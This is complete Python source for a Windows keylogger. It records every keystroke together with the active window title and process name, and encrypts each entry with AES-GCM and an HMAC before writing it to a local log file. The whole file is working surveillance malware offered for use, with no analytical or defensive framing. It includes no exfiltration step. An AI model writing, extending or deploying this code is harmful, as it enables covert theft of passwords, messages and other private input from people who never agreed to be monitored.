import os
import json
import base64
import time
import hmac
import hashlib
from pynput import keyboard
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import psutil
import win32gui
import win32process

# Load environment variables for AES and HMAC keys
KEY = os.environ.get("KEYLOGGER_AES_KEY")  # Base64 encoded 32-byte key
HMAC_KEY = os.environ.get("KEYLOGGER_HMAC_KEY")  # Base64 encoded 32-byte key
LOG_FILE = "keylog_encrypted.txt"

# Check for valid keys
if not KEY or not HMAC_KEY:
    raise EnvironmentError("Keys not set in environment variables.")

# Decode keys from base64
KEY = base64.b64decode(KEY)
HMAC_KEY = base64.b64decode(HMAC_KEY)

def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        return win32gui.GetWindowText(hwnd), process.name()
    except Exception:
        return "Unknown", "Unknown"

def encrypt_log_entry(entry: dict) -> str:
    aesgcm = AESGCM(KEY)
    nonce = os.urandom(12)
    data = json.dumps(entry).encode()
    encrypted = aesgcm.encrypt(nonce, data, None)
    hmac_digest = hmac.new(HMAC_KEY, encrypted, hashlib.sha256).digest()
    log_record = {
        "nonce": base64.b64encode(nonce).decode(),
        "data": base64.b64encode(encrypted).decode(),
        "hmac": base64.b64encode(hmac_digest).decode()
    }
    return json.dumps(log_record)

def on_press(key):
    # Stop logger on ESC key
    if key == keyboard.Key.esc:
        print("[+] Logger stopped.")
        return False  # Stops the listener

    try:
        k = key.char
    except AttributeError:
        k = str(key)

    window_title, process_name = get_active_window_info()
    entry = {
        "timestamp": time.time(),
        "key": k,
        "window": window_title,
        "process": process_name
    }
    with open(LOG_FILE, "a") as f:
        f.write(encrypt_log_entry(entry) + "\n")

def main():
    print("[+] Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
